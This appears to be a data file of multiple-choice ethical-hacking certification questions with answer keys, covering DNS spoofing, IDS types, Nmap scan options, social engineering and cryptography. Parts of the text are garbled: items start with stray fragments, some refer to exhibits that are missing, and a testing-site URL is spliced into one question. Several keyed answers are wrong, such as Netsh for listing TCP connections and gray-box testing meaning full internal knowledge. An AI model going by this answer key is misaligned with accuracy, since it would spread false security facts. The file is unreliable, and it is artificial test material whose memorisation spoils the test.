"Let's imagine three companies (A, B and C), all competing in a challenging global environment. Company A and B are working together in developing a product that will generate a major competitive advantage for them. Company A has a secure DNS server while company B has a DNS server vulnerable to spoofing. With a spoofing attack on the DNS server of company B, company C gains access to outgoing e-mails from company B. How do you prevent DNS spoofing?\nA. Install DNS logger and track vulnerable packets\nB. Disable DNS timeouts\nC. Install DNS Anti-spoofing\nD. Disable DNS Zone Transfer\n","Answer: C — C. Install DNS Anti-spoofing"
"Which Intrusion Detection System is the best applicable for large environments where critical assets on the network need extra scrutiny and is ideal for observing sensitive network segments?\nA. Honeypots\nB. Firewalls\nC. Network-based intrusion detection system (NIDS)\nD. Host-based intrusion detection system (HIDS)\n","Answer: C — C. Network-based intrusion detection system (NIDS)"
"A large company intends to use Blackberry for corporate mobile phones and a security analyst is assigned to evaluate the possible threats. The analyst will use the Blackjacking attack method to demonstrate how an attacker could circumvent perimeter defenses and gain access to the Prometric Online Testing – Reports https://ibt1.prometric.com/users/custom/report_queue/rq_str... corporate network. What tool should the analyst use to perform a Blackjacking attack?\nA. Paros Proxy\nB. BBProxy\nC. Blooover\nD. BBCrack\n","Answer: B — B. BBProxy"
"What is the minimum number of network connections in a multihomed firewall?\nA. 3\nB. 5\nC. 4\nD. 2\n","Answer: A — A. 3"
"Which of the following is a component of a risk assessment?\nA. Administrative safeguards\nB. Physical security\nC. DMZ\nD. Logical interface\n","Answer: A — A. Administrative safeguards"
"Session splicing is an IDS evasion technique in which an attacker delivers data in multiple, small sized packets to the target computer, making it very difficult for an IDS to detect the attack signatures. Which tool can be used to perform session splicing attacks?\nA. tcpsplice\nB. Burp\nC. Hydra\nD. Whisker\n","Answer: D — D. Whisker"
"Which of the following is not a Bluetooth attack?\nA. Bluedriving\nB. Bluesmacking\nC. Bluejacking\nD. Bluesnarfing\n","Answer: A — A. Bluedriving"
"What is the proper response for a NULL scan if the port is closed?\nA. SYN\nB. ACK\nC. FIN\nD. PSH\nE. RST\nF. No response\n","Answer: E — E. RST"
"You are the Network Admin, and you get a complaint that some of the websites are no longer accessible. You try to ping the servers and find them to be reachable. Then you type the IP address and then you try on the browser, and find it to be accessible. But they are not accessible when you try using the URL. What may be the problem?\nA. Traffic is Blocked on UDP Port 53\nB. Traffic is Blocked on TCP Port 80\nC. Traffic is Blocked on TCP Port 54\nD. Traffic is Blocked on UDP Port 80\n","Answer: A — A. Traffic is Blocked on UDP Port 53"
"If a token and 4-digit personal identification number (PIN) are used to access a computer system and the token performs off-line checking for the correct PIN, what type of attack is possible?\nA. Birthday\nB. Brute force\nC. Man-in-the-middle\nD. Smurf\n","Answer: B — B. Brute force"
"Peter, a Network Administrator, has come to you looking for advice on a tool that would help him perform SNMP enquires over the network. Which of these tools would do the SNMP enumeration he is looking for? Select the best answers.\nA. SNMPUtil\nB. SNScan\nC. SNMPScan\nD. Solarwinds IP Network Browser\nE. NMap\n","Answer: ABD — A. SNMPUtil; B. SNScan; D. Solarwinds IP Network Browser"
"What is a ??Collision attack?? in cryptography?\nA. Collision attacks try to get the public key\nB. Collision attacks try to break the hash into three parts to get the plaintext value\nC. Collision attacks try to break the hash into two parts, with the same bytes in each part to get the private key\nD. Collision attacks try to find two inputs producing the same hash\n","Answer: D — D. Collision attacks try to find two inputs producing the same hash"
"PGP, SSL, and IKE are all examples of which type of cryptography?\nA. Digest\nB. Secret Key\nC. Public Key\nD. Hash Algorithm\n","Answer: C — C. Public Key"
"MX record priority increases as the number increases. (True/False.)\nA. True\nB. False\n","Answer: B — B. False"
"A company??s policy requires employees to perform file transfers using protocols which encrypt traffic. You suspect some employees are still performing file transfers using unencrypted protocols because the employees do not like changes. You have positioned a network sniffer to capture traffic from the laptops used by employees in the data ingest department. Using Wireshark to examine the captured traffic, which command can be used as display filter to find unencrypted file transfers?\nA. tcp.port = = 21\nB. tcp.port = 23\nC. tcp.port = = 21 | | tcp.port = =22\nD. tcp.port ! = 21\n","Answer: A — A. tcp.port = = 21"
"s) What is the known plaintext attack used against DES which gives the result that encrypting plaintext with one DES key followed by encrypting it with a second DES key is no more secure than using a single key?\nA. Man-in-the-middle attack\nB. Meet-in-the-middle attack\nC. Replay attack\nD. Traffic analysis attack\n","Answer: B — B. Meet-in-the-middle attack"
"Which of the following represents the initial two commands that an IRC client sends to join an IRC network?\nA. USER, NICK\nB. LOGIN, NICK\nC. USER, PASS\nD. LOGIN, USER\n","Answer: A — A. USER, NICK"
"The establishment of a TCP connection involves a negotiation called three-way handshake. What type of message does the client send to the server in order to begin this negotiation?\nA. ACK\nB. SYN\nC. RST\nD. SYN-ACK\n","Answer: B — B. SYN"
"You just set up a security system in your network. In what kind of system would you find the following string of characters used as a rule within its configuration? alert tcp any any -> 192.168.100.0/24 21 (msg: ????FTP on the network!????;)\nA. A firewall IPTable\nB. FTP Server rule\nC. A Router IPTable\nD. An Intrusion Detection System\n","Answer: D — D. An Intrusion Detection System"
"Which of the following tools are used for enumeration? (Choose three.)\nA. SolarWinds\nB. USER2SID\nC. Cheops\nD. SID2USER\nE. DumpSec\n","Answer: BDE — B. USER2SID; D. SID2USER; E. DumpSec"
"s) What is Eve trying to do?\nA. Eve is trying to connect as a user with Administrator privileges\nB. Eve is trying to enumerate all users with Administrative privileges\nC. Eve is trying to carry out a password crack for user Administrator\nD. Eve is trying to escalate privilege of the null user to that of Administrator\n","Answer: C — C. Eve is trying to carry out a password crack for user Administrator"
"You are tasked to perform a penetration test. While you are performing information gathering, you find an employee list in Google. You find the receptionist??s email, and you send her an email changing the source email to her boss??s email (boss@company). In this email, you ask for a pdf with information. She reads your email and sends back a pdf with links. You exchange the pdf links with your malicious links (these links contain malware) and send back the modified pdf, saying that the links don??t work. She reads your email, opens the links, and her machine gets infected. You now have access to the company network. What testing method did you use?\nA. Social engineering\nB. Piggybacking\nC. Tailgating\nD. Eavesdropping\n","Answer: A — A. Social engineering"
"Which of the following statements about a zone transfer is correct? (Choose three.)\nA. A zone transfer is accomplished with the DNS\nB. A zone transfer is accomplished with the nslookup service\nC. A zone transfer passes all zone information that a DNS server maintains\nD. A zone transfer passes all zone information that a nslookup server maintains\nE. A zone transfer can be prevented by blocking all inbound TCP port 53 connections\nF. Zone transfers cannot occur on the Internet\n","Answer: ACE — A. A zone transfer is accomplished with the DNS; C. A zone transfer passes all zone information that a DNS server maintains; E. A zone transfer can be prevented by blocking all inbound TCP port 53 connections"
"As a securing consultant, what are some of the things you would recommend to a company to ensure DNS security?\nA. Use the same machines for DNS and other applications\nB. Harden DNS servers\nC. Use split-horizon operation for DNS servers\nD. Restrict Zone transfers\nE. Have subnet diversity between DNS servers\n","Answer: BCDE — B. Harden DNS servers; C. Use split-horizon operation for DNS servers; D. Restrict Zone transfers; E. Have subnet diversity between DNS servers"
"A hacker is an intelligent individual with excellent computer skills and the ability to explore a computer??s software and hardware without the owner??s permission. Their intention can either be to simply gain knowledge or to illegally make changes. Which of the following class of hacker refers to an individual who works both offensively and defensively at various times?\nA. White Hat\nB. Suicide Hacker\nC. Gray Hat\nD. Black Hat\n","Answer: C — C. Gray Hat"
"Which of the following incident handling process phases is responsible for defining rules, collaborating human workforce, creating a back-up plan, and testing the plans for an organization?\nA. Preparation phase\nB. Containment phase\nC. Identification phase\nD. Recovery phase\n","Answer: A — A. Preparation phase"
"Which of the following tools is used to detect wireless LANs using the 802.11a/b/g/n WLAN standards on a linux platform?\nA. Kismet\nB. Abel\nC. Netstumbler\nD. Nessus\n","Answer: A — A. Kismet"
"The configuration allows a wired or wireless network interface controller to pass all traffic it receives to the Central Processing Unit (CPU), rather than passing only the frames that the controller is intended to receive. Which of the following is being described?\nA. Multi-cast mode\nB. Promiscuous mode\nC. WEM\nD. Port forwarding\n","Answer: B — B. Promiscuous mode"
"Which of the following is a low-tech way of gaining unauthorized access to systems?\nA. Social Engineering\nB. Eavesdropping\nC. Scanning\nD. Sniffing\n","Answer: A — A. Social Engineering"
"What is correct about digital signatures?\nA. A digital signature cannot be moved from one signed document to another because it is the hash of the original document encrypted with the private key of the signing party.\nB. Digital signatures may be used in different documents of the same type.\nC. A digital signature cannot be moved from one signed document to another because it is a plain hash of the document content.\nD. Digital signatures are issued once for each user and can be used everywhere until they expire.\n","Answer: A — A. A digital signature cannot be moved from one signed document to another because it is the hash of the original document encrypted with the private key of the signing party."
"What is a NULL scan?\nA. A scan in which all flags are turned off\nB. A scan in which certain flags are off\nC. A scan in which all flags are on\nD. A scan in which the packet size is set to zero\nE. A scan with an illegal packet size\n","Answer: A — A. A scan in which all flags are turned off"
"A large mobile telephony and data network operator has a data center that houses network elements. These are essentially large computers running on Linux. The perimeter of the data center is secured with firewalls and IPS systems. What is the best security policy concerning this setup?\nA. Network elements must be hardened with user ids and strong password\nB. Regular security tests and audits should be performed.\nC. As long as the physical access to the network elements is restricted, there is no need for additional measures.\nD. There is no need for specific security measures on the network elements as long as firewalls and IPS systems exist.\nE. The operator knows that attacks and down time are inevitable and should have a backup site.\n","Answer: A — A. Network elements must be hardened with user ids and strong password"
"Which of the following describes the characteristics of a Boot Sector Virus?\nA. Modifies directory table entries so that directory entries point to the virus code instead of the actual program.\nB. Moves the MBR to another location on the RAM and copies itself to the original location of the MBR.\nC. Moves the MBR to another location on the hard disk and copies itself to the original location of the MBR.\nD. Overwrites the original MBR and only executes the new virus code.\n","Answer: C — C. Moves the MBR to another location on the hard disk and copies itself to the original location of the MBR."
"The ??Gray-box testing?? methodology enforces what kind of restriction?\nA. Only the external operation of a system is accessible to the tester.\nB. The internal operation of a system in only partly accessible to the tester.\nC. Only the internal operation of a system is known to the tester.\nD. The internal operation of a system is completely known to the tester.\n","Answer: D — D. The internal operation of a system is completely known to the tester."
"The company ABC recently contracts a new accountant. The accountant will be working with the financial statements. Those financial statements need to be approved by the CFO and then they will be sent to the accountant but the CFO is worried because he wants to be sure that the information sent to the accountant was not modified once he approved it. Which of the following options can be useful to ensure the integrity of the data?\nA. The CFO can use a hash algorithm in the document once he approved the financial statements\nB. The CFO can use an excel file with a password\nC. The financial statements can be sent twice, one by email and the other delivered in USB and the accountant can compare both to be sure is the same document\nD. The document can be sent to the accountant using an exclusive USB for that document\n","Answer: A — A. The CFO can use a hash algorithm in the document once he approved the financial statements"
"Scenario1: * 1. Victim opens the attacker's web site. * 2. Attacker sets up a web site which contains interesting and attractive content like 'Do you want to make $1000 in a day?'. * 3. Victim clicks to the interesting and attractive content URL. * 4. Attacker creates a transparent 'iframe' in front of the URL which victim attempts to click, so victim thinks that he/she clicks to the 'Do you want to make $1000 in a day?' URL but actually he/she clicks to the content or URL that exists in the transparent 'iframe' which is setup by the attacker. What is the name of the attack which is mentioned in the scenario?\nA. Session Fixation\nB. HTML Injection\nC. HTTP Parameter Pollution\nD. Clickjacking Attack\n","Answer: D — D. Clickjacking Attack"
"Which type of security feature stops vehicles from crashing through the doors of a building?\nA. Bollards\nB. Receptionist\nC. Mantrap\nD. Turnstile\n","Answer: A — A. Bollards"
"When you are getting information about a web server, it is very important to know the HTTP Methods (GET, POST, HEAD, PUT, DELETE, TRACE) that are available because there are two critical methods (PUT and DELETE). PUT can upload a file to the server and DELETE can delete a file from the server. You can detect all these methods (GET, POST, HEAD, DELETE, PUT, TRACE) using NMAP script engine. What Nmap script will help you with this task?\nA. http-methods\nB. http enum\nC. http-headers\nD. http-git\n","Answer: A — A. http-methods"
"By using a smart card and pin, you are using a two-factor authentication that satisfies\nA. Something you are and something you remember\nB. Something you have and something you know\nC. Something you know and something you are\nD. Something you have and something you are\n","Answer: B — B. Something you have and something you know"
"What did the following commands determine?\nA. That the Joe account has a SID of 500\nB. These commands demonstrate that the guest account has NOT been disabled\nC. These commands demonstrate that the guest account has been disabled\nD. That the true administrator is Joe\nE. Issued alone, these commands prove nothing\n","Answer: D — D. That the true administrator is Joe"
"Null sessions are un-authenticated connections (not using a username or password.) to an NT or 2000 system. Which TCP and UDP ports must you filter to check null sessions on your network?\nA. 137 and 139\nB. 137 and 443\nC. 139 and 443\nD. 139 and 445\n","Answer: D — D. 139 and 445"
"Which of the following Linux commands will resolve a domain name into IP address?\nA. >host-t a hackeddomain.com\nB. >host-t ns hackeddomain.com\nC. >host -t soa hackeddomain.com\nD. >host -t AXFR hackeddomain.com\n","Answer: A — A. >host-t a hackeddomain.com"
"What is the role of test automation in security testing?\nA. It is an option but it tends to be very expensive.\nB. It should be used exclusivel\nC. Manual testing is outdated because of low speed and possible test setup inconsistencies.\nD. Test automation is not usable in security due to the complexity of the tests.\nE. It can accelerate benchmark tests and repeat them with a consistent test setu\nF. But it cannot replace manual testing completely.\n","Answer: D — D. Test automation is not usable in security due to the complexity of the tests."
"An Intrusion Detection System (IDS) has alerted the network administrator to a possibly malicious sequence of packets sent to a Web server in the network??s external DMZ. The packet traffic was captured by the IDS and saved to a PCAP file. What type of network tool can be used to determine if these packets are genuinely malicious or simply a false positive?\nA. Protocol analyzer\nB. Network sniffer\nC. Intrusion Prevention System (IPS)\nD. Vulnerability scanner\n","Answer: A — A. Protocol analyzer"
"You are a penetration tester working to test the user awareness of the employees of the client xyz. You harvested two employees' emails from some public sources and are creating a client-side backdoor to send it to the employees via email. Which stage of the cyber kill chain are you at?\nA. Reconnaissance\nB. Command and control\nC. Weaponization\nD. Exploitation\n","Answer: C — C. Weaponization"
"Jim, a professional hacker, targeted an organization that is operating critical Industrial Infrastructure. Jim used Nmap to scan open pons and running services on systems connected to the organization's OT network. He used an Nmap command to identify Ethernet/IP devices connected to the Internet and further gathered Information such as the vendor name, product code and name, device name, and IP address. Which of the following Nmap commands helped Jim retrieve the required information?\nA. nmap -Pn -sT --scan-delay 1s --max-parallelism 1 -p < Port List > < Target IP >\nB. nmap -Pn -sU -p 44818 --script enip-info < Target IP >\nC. nmap -Pn -sT -p 46824 < Target IP >\nD. nmap -Pn -sT -p 102 --script s7-info < Target IP >\n","Answer: B — B. nmap -Pn -sU -p 44818 --script enip-info < Target IP >"
"Steve, an attacker, created a fake profile on a social media website and sent a request to Stella. Stella was enthralled by Steve's profile picture and the description given for his profile, and she initiated a conversation with him soon after accepting the request. After a few days. Sieve started asking about her company details and eventually gathered all the essential information regarding her company. What is the social engineering technique Steve employed in the above scenario?\nA. Diversion theft\nB. Baiting\nC. Honey trap\nD. Piggybacking\n","Answer: C — C. Honey trap"
"How is the public key distributed in an orderly, controlled fashion so that the users can be sure of the sender??s identity?\nA. Hash value\nB. Private key\nC. Digital signature\nD. Digital certificate\n","Answer: D — D. Digital certificate"
"Nedved is an IT Security Manager of a bank in his country. One day. he found out that there is a security breach to his company's email server based on analysis of a suspicious connection from the email server to an unknown IP Address. What is the first thing that Nedved needs to do before contacting the incident response team?\nA. Leave it as it Is and contact the incident response te3m right away\nB. Block the connection to the suspicious IP Address from the firewall\nC. Disconnect the email server from the network\nD. Migrate the connection to the backup email server\n","Answer: C — C. Disconnect the email server from the network"
"s) which of the following protocols can be used to secure an LDAP service against anonymous queries?\nA. SSO\nB. RADIUS\nC. WPA\nD. NTLM\n","Answer: D — D. NTLM"
"Boney, a professional hacker, targets an organization for financial benefits. He performs an attack by sending his session ID using an MITM attack technique. Boney first obtains a valid session ID by logging into a service and later feeds the same session 10 to the target employee. The session ID links the target employee to Boneys account page without disclosing any information to the victim. When the target employee clicks on the link, all the sensitive payment details entered in a form are linked to Boneys account. What is the attack performed by Boney in the above scenario?\nA. Session donation attack\nB. Session fixation attack\nC. Forbidden attack\nD. CRIME attack\n","Answer: A — A. Session donation attack"
"Vlady works in a fishing company where the majority of the employees have very little understanding of IT let alone IT Security. Several information security issues that Vlady often found includes, employees sharing password, writing his/her password on a post it note and stick it to his/her desk, leaving the computer unlocked, didn??t log out from emails or other social media accounts, and etc. After discussing with his boss, Vlady decided to make some changes to improve the security environment in his company. The first thing that Vlady wanted to do is to make the employees understand the importance of keeping confidential information, such as password, a secret and they should not share it with other persons. Which of the following steps should be the first thing that Vlady should do to make the employees in his company understand to importance of keeping confidential information a secret?\nA. Warning to those who write password on a post it note and put it on his/her desk\nB. Developing a strict information security policy\nC. Information security awareness training\nD. Conducting a one to one discussion with the other employees about the importance of information security\n","Answer: A — A. Warning to those who write password on a post it note and put it on his/her desk"
"What is one of the advantages of using both symmetric and asymmetric cryptography in SSL/TLS?\nA. Symmetric algorithms such as AES provide a failsafe when asymmetric methods fail.\nB. Asymmetric cryptography is computationally expensive in compariso\nC. However, it is well-suited to securely negotiate keys for use with symmetric cryptography.\nD. Symmetric encryption allows the server to securely transmit the session keys out-of- band.\nE. Supporting both types of algorithms allows less-powerful devices such as mobile phones to use symmetric encryption instead.\n","Answer: D — D. Symmetric encryption allows the server to securely transmit the session keys out-of- band."
"Ethical hacker jane Smith is attempting to perform an SQL injection attach. She wants to test the response time of a true or false response and wants to use a second command to determine whether the database will return true or false results for user IDs. which two SQL Injection types would give her the results she is looking for?\nA. Out of band and boolean-based\nB. Time-based and union-based\nC. union-based and error-based\nD. Time-based and boolean-based\n","Answer: D — D. Time-based and boolean-based"
"What kind of detection techniques is being used in antivirus softwares that identifies malware by collecting data from multiple protected systems and instead of analyzing files locally it's made on the premiers environment-\nA. VCloud based\nB. Honypot based\nC. Behaviour based\nD. Heuristics based\n","Answer: A — A. VCloud based"
"Bella, a security professional working at an it firm, finds that a security breach has occurred while transferring important files. Sensitive data, employee usernames. and passwords are shared In plaintext, paving the way for hackers 10 perform successful session hijacking. To address this situation. Bella Implemented a protocol that sends data using encryption and digital certificates. Which of the following protocols Is used by Bella?\nA. FTP\nB. HTTPS\nC. FTPS\nD. IP\n","Answer: C — C. FTPS"
"is a tool that can hide processes from the process list, can hide files, registry entries, and intercept keystrokes.\nA. Trojan\nB. RootKit\nC. DoS tool\nD. Scanner\nE. Backdoor\n","Answer: B — B. RootKit"
"These hackers have limited or no training and know how to use only basic techniques or tools. What kind of hackers are we talking about?\nA. Black-Hat Hackers A\nB. Script Kiddies\nC. White-Hat Hackers\nD. Gray-Hat Hacker\n","Answer: B — B. Script Kiddies"
"Sam is working as a system administrator In an organization. He captured the principal characteristics of a vulnerability and produced a numerical score to reflect Its severity using CVSS v3.0 to property assess and prioritize the organization's vulnerability management processes. The base score that Sam obtained after performing cvss rating was 4.0. What is the CVSS severity level of the vulnerability discovered by Sam in the above scenario?\nA. Medium\nB. Low\nC. Critical\nD. High\n","Answer: A — A. Medium"
"John is an incident handler at a financial institution. His steps in a recent incident are not up to the standards of the company. John frequently forgets some steps and procedures while handling responses as they are very stressful to perform. Which of the following actions should John take to overcome this problem with the least administrative effort?\nA. Create an incident checklist.\nB. Select someone else to check the procedures.\nC. Increase his technical skills.\nD. Read the incident manual every time it occurs.\n","Answer: C — C. Increase his technical skills."
"What is the first step for a hacker conducting a DNS cache poisoning (DNS spoofing) attack against an organization?\nA. The attacker queries a nameserver using the DNS resolver.\nB. The attacker makes a request to the DNS resolver.\nC. The attacker forges a reply from the DNS resolver.\nD. The attacker uses TCP to poison the ONS resofver.\n","Answer: B — B. The attacker makes a request to the DNS resolver."
"Clark is a professional hacker. He created and configured multiple domains pointing to the same host to switch quickly between the domains and avoid detection. Identify the behavior of the adversary In the above scenario.\nA. use of command-line interface\nB. Data staging\nC. Unspecified proxy activities\nD. Use of DNS tunneling\n","Answer: C — C. Unspecified proxy activities"
"What type of analysis is performed when an attacker has partial knowledge of inner- workings of the application?\nA. Black-box\nB. Announced\nC. White-box\nD. Grey-box\n","Answer: D — D. Grey-box"
"What would be the fastest way to perform content enumeration on a given web server by using the Gobuster tool?\nA. Performing content enumeration using the bruteforce mode and 10 threads\nB. Shipping SSL certificate verification\nC. Performing content enumeration using a wordlist\nD. Performing content enumeration using the bruteforce mode and random file extensions\n","Answer: C — C. Performing content enumeration using a wordlist"
"A friend of yours tells you that he downloaded and executed a file that was sent to him by a coworker. Since the file did nothing when executed, he asks you for help because he suspects that he may have installed a trojan on his computer. what tests would you perform to determine whether his computer Is Infected?\nA. Use ExifTool and check for malicious content.\nB. You do not check; rather, you immediately restore a previous snapshot of the operating system.\nC. Upload the file to VirusTotal.\nD. Use netstat and check for outgoing connections to strange IP addresses or domains.\n","Answer: D — D. Use netstat and check for outgoing connections to strange IP addresses or domains."
"An organization is performing a vulnerability assessment tor mitigating threats. James, a pen tester, scanned the organization by building an inventory of the protocols found on the organization's machines to detect which ports are attached to services such as an email server, a web server or a database server. After identifying the services, he selected the vulnerabilities on each machine and started executing only the relevant tests. What is the type of vulnerability assessment solution that James employed in the above scenario?\nA. Product-based solutions\nB. Tree-based assessment\nC. Service-based solutions\nD. inference-based assessment\n","Answer: D — D. inference-based assessment"
"Gavin owns a white-hat firm and is performing a website security audit for one of his clients. He begins by running a scan which looks for common misconfigurations and outdated software versions. Which of the following tools is he most likely using?\nA. Nikto\nB. Nmap\nC. Metasploit\nD. Armitage\n","Answer: B — B. Nmap"
"During the process of encryption and decryption, what keys are shared?\nA. Private keys\nB. User passwords\nC. Public keys\nD. Public and private keys\n","Answer: C — C. Public keys"
"Abel, a cloud architect, uses container technology to deploy applications/software including all its dependencies, such as libraries and configuration files, binaries, and other resources that run independently from other processes in the cloud environment. For the containerization of applications, he follows the five-tier container technology architecture. Currently. Abel is verifying and validating image contents, signing images, and sending them to the registries. Which of the following tiers of the container technology architecture Is Abel currently working in?\nA. Tier-1: Developer machines\nB. Tier-4: Orchestrators\nC. Tier-3: Registries\nD. Tier-2: Testing and accreditation systems\n","Answer: D — D. Tier-2: Testing and accreditation systems"
"Henry Is a cyber security specialist hired by BlackEye - Cyber security solutions. He was tasked with discovering the operating system (OS) of a host. He used the Unkornscan tool to discover the OS of the target system. As a result, he obtained a TTL value, which Indicates that the target system is running a Windows OS. Identify the TTL value Henry obtained, which indicates that the target OS is Windows.\nA. 64\nB. 128\nC. 255\nD. 138\n","Answer: B — B. 128"
"When a security analyst prepares for the formal security assessment - what of the following should be done in order to determine inconsistencies in the secure assets database and verify that system is compliant to the minimum security baseline?\nA. Data items and vulnerability scanning\nB. Interviewing employees and network engineers\nC. Reviewing the firewalls configuration\nD. Source code review\n","Answer: A — A. Data items and vulnerability scanning"
"which type of virus can change its own code and then cipher itself multiple times as it replicates?\nA. Stealth virus\nB. Tunneling virus\nC. Cavity virus\nD. Encryption virus\n","Answer: A — A. Stealth virus"
"Which of the following statements is FALSE with respect to Intrusion Detection Systems?\nA. Intrusion Detection Systems can be configured to distinguish specific content in network packets\nB. Intrusion Detection Systems can easily distinguish a malicious payload in an encrypted traffic\nC. Intrusion Detection Systems require constant update of the signature library\nD. Intrusion Detection Systems can examine the contents of the data n context of the network protocol\n","Answer: B — B. Intrusion Detection Systems can easily distinguish a malicious payload in an encrypted traffic"
"Which of the following DoS tools is used to attack target web applications by starvation of available sessions on the web server? The tool keeps sessions at halt using never-ending POST transmissions and sending an arbitrarily large content-length header value.\nA. My Doom\nB. Astacheldraht\nC. R-U-Dead-Yet?(RUDY)\nD. LOIC\n","Answer: C — C. R-U-Dead-Yet?(RUDY)"
"Morris, a professional hacker, performed a vulnerability scan on a target organization by sniffing the traffic on the network lo identify the active systems, network services, applications, and vulnerabilities. He also obtained the list of the users who are currently accessing the network. What is the type of vulnerability assessment that Morris performed on the target organization?\nA. internal assessment\nB. Passive assessment\nC. External assessment\nD. Credentialed assessment\n","Answer: B — B. Passive assessment"
"Attacker Steve targeted an organization's network with the aim of redirecting the company's web traffic to another malicious website. To achieve this goal, Steve performed DNS cache poisoning by exploiting the vulnerabilities In the DNS server software and modified the original IP address of the target website to that of a fake website. What is the technique employed by Steve to gather information for identity theft?\nA. Pretexting\nB. Pharming\nC. Wardriving\nD. Skimming\n","Answer: B — B. Pharming"
"Gilbert, a web developer, uses a centralized web API to reduce complexity and increase the Integrity of updating and changing data. For this purpose, he uses a web service that uses HTTP methods such as PUT. POST. GET. and DELETE and can improve the overall performance, visibility, scalability, reliability, and portability of an application. What is the type of web-service API mentioned in the above scenario?\nA. JSON-RPC\nB. SOAP API\nC. RESTful API\nD. REST API\n","Answer: C — C. RESTful API"
"This form of encryption algorithm is asymmetric key block cipher that is characterized by a 128-bit block size, and its key size can be up to 256 bits. Which among the following is this encryption algorithm?\nA. Twofish encryption algorithm\nB. HMAC encryption algorithm\nC. IDEA\nD. Blowfish encryption algorithm\n","Answer: A — A. Twofish encryption algorithm"
"Which command can be used to show the current TCP/IP connections?\nA. Netsh\nB. Netstat\nC. Net use connection\nD. Net use\n","Answer: A — A. Netsh"
"Tremp is an IT Security Manager, and he is planning to deploy an IDS in his small company. He is looking for an IDS with the following characteristics: - Verifies success or failure of an attack - Monitors system activities Detects attacks that a network-based IDS fails to detect - Near real-time detection and response - Does not require additional hardware - Lower entry cost Which type of IDS is best suited for Tremp's requirements?\nA. Gateway-based IDS\nB. Network-based IDS\nC. Host-based IDS\nD. Open source-based\n","Answer: C — C. Host-based IDS"
"Which of the following are well known password-cracking programs?\nA. L0phtcrack\nB. NetCat\nC. Jack the Ripper\nD. Netbus\nE. John the Ripper\n","Answer: AE — A. L0phtcrack; E. John the Ripper"
"What is the algorithm used by LM for Windows2000 SAM?\nA. MD4\nB. DES\nC. SHA\nD. SSL\n","Answer: B — B. DES"
"In Trojan terminology, what is a covert channel?\nA. A channel that transfers information within a computer system or network in a way that violates the security policy\nB. A legitimate communication path within a computer system or network for transfer of data\nC. It is a kernel operation that hides boot processes and services to mask detection\nD. It is Reverse tunneling technique that uses HTTPS protocol instead of HTTP protocol to establish connections\n","Answer: A — A. A channel that transfers information within a computer system or network in a way that violates the security policy"
"Emily, an extrovert obsessed with social media, posts a large amount of private information, photographs, and location tags of recently visited places. Realizing this. James, a professional hacker, targets Emily and her acquaintances, conducts a location search to detect their geolocation by using an automated tool, and gathers information to perform other sophisticated attacks. What is the tool employed by James in the above scenario?\nA. ophcrack\nB. Hootsuite\nC. VisualRoute\nD. HULK\n","Answer: B — B. Hootsuite"
"s) for his company for over 15 years and has become very successful. One day, Yancey comes in to work and finds out that the company will be downsizing and he will be out of a job in two weeks. Yancey is very angry and decides to place logic bombs, viruses, Trojans, and backdoors all over the network to take down the company once he has left. Yancey does not care if his actions land him in jail for 30 or more years, he just wants the company to pay for what they are doing to him. What would Yancey be considered?\nA. Yancey would be considered a Suicide Hacker\nB. Since he does not care about going to jail, he would be considered a Black Hat\nC. Because Yancey works for the company currently; he would be a White Hat\nD. Yancey is a Hacktivist Hacker since he is standing up to a company that is downsizing\n","Answer: A — A. Yancey would be considered a Suicide Hacker"
"What piece of hardware on a computer's motherboard generates encryption keys and only releases a part of the key so that decrypting a disk on a new piece of hardware is not possible?\nA. CPU\nB. GPU\nC. UEFI\nD. TPM\n","Answer: D — D. TPM"
"An attacker redirects the victim to malicious websites by sending them a malicious link by email. The link appears authentic but redirects the victim to a malicious web page, which allows the attacker to steal the victim's data. What type of attack is this?\nA. Phishing\nB. Vlishing\nC. Spoofing\nD. DDoS\n","Answer: A — A. Phishing"
"Abel, a security professional, conducts penetration testing in his client organization to check for any security loopholes. He launched an attack on the DHCP servers by broadcasting forged DHCP requests and leased all the DHCP addresses available in the DHCP scope until the server could not issue any more IP addresses. This led to a Dos attack, and as a result, legitimate employees were unable to access the clients network. Which of the following attacks did Abel perform in the above scenario?\nA. VLAN hopping\nB. DHCP starvation\nC. Rogue DHCP server attack\nD. STP attack\n","Answer: B — B. DHCP starvation"
"what is the port to block first in case you are suspicious that an loT device has been compromised?\nA. 22\nB. 443\nC. 48101\nD. 80\n","Answer: C — C. 48101"
"While browsing his Facebook teed, Matt sees a picture one of his friends posted with the caption. ""Learn more about your friends!"", as well as a number of personal questions. Matt is suspicious and texts his friend, who confirms that he did indeed post it. With assurance that the post is legitimate. Matt responds to the questions on the post, a few days later. Mates bank account has been accessed, and the password has been changed. What most likely happened?\nA. Matt inadvertently provided the answers to his security questions when responding to the post.\nB. Matt's bank-account login information was brute forced.\nC. Matt Inadvertently provided his password when responding to the post.\nD. Matt's computer was infected with a keylogger.\n","Answer: A — A. Matt inadvertently provided the answers to his security questions when responding to the post."
"Techno Security Inc. recently hired John as a penetration tester. He was tasked with identifying open ports in the target network and determining whether the ports are online and any firewall rule sets are encountered. John decided to perform a TCP SYN ping scan on the target network. Which of the following Nmap commands must John use to perform the TCP SYN ping scan?\nA. nmap -sn -pp < target ip address >\nB. nmap -sn -PO < target IP address >\nC. nmap -sn -PS < target IP address >\nD. nmap -sn -PA < target IP address >\n","Answer: C — C. nmap -sn -PS < target IP address >"
"While testing a web application in development, you notice that the web server does not properly ignore the ??dot dot slash?? (../) character string and instead returns the file listing of a folder structure of the server. What kind of attack is possible in this scenario?\nA. Cross-site scripting\nB. Denial of service\nC. SQL injection\nD. Directory traversal\n","Answer: D — D. Directory traversal"
"While examining audit logs, you discover that people are able to telnet into the SMTP server on port 25. You would like to block this, though you do not see any evidence of an attack or other wrong doing. However, you are concerned about affecting the normal functionality of the email server. From the following options choose how best you can achieve this objective?\nA. Block port 25 at the firewall.\nB. Shut off the SMTP service on the server.\nC. Force all connections to use a username and password.\nD. Switch from Windows Exchange to UNIX Sendmail.\nE. None of the above.\n","Answer: E — E. None of the above."
"Password cracking programs reverse the hashing process to recover passwords. (True/False.)\nA. True\nB. False\n","Answer: B — B. False"
